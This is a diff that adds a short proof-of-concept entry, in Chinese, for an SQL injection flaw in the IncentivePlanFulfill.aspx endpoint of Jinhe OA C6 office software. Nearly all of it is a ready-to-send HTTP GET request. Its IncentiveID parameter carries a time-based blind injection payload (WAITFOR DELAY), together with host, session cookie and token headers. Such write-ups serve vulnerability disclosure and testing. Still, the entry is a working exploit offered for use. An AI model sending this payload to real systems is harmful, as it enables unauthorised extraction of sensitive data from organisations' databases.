@@ -1,0 +1,10 @@
+# 金和OA C6 IncentivePlanFulfill.aspx SQL注入漏洞
+# 金和OA是一款企业级办公自动化软件,旨在提供高效的办公流程管理和协作解决方案。C6协同系统存在SQL注入漏洞，攻击者可构造恶意请求获取数据库敏感数据。
+GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1&acid=80051406&bid=hd_tag_m8mv24rb HTTP/1.1
+Host: www.swaf.com
+Cookie: ASP.NET_SessionId=0uha1u0nhrn4meghddjiwu0y
+RM-PRO-BusinessID: hd_tag_m8mv24rb
+RM-PRO-Token: 6b88a8be449a7ea1cfc271fadff53895
+RM-PRO-Time: 1742808407528
+User-Agent: curl/7.83.1
+
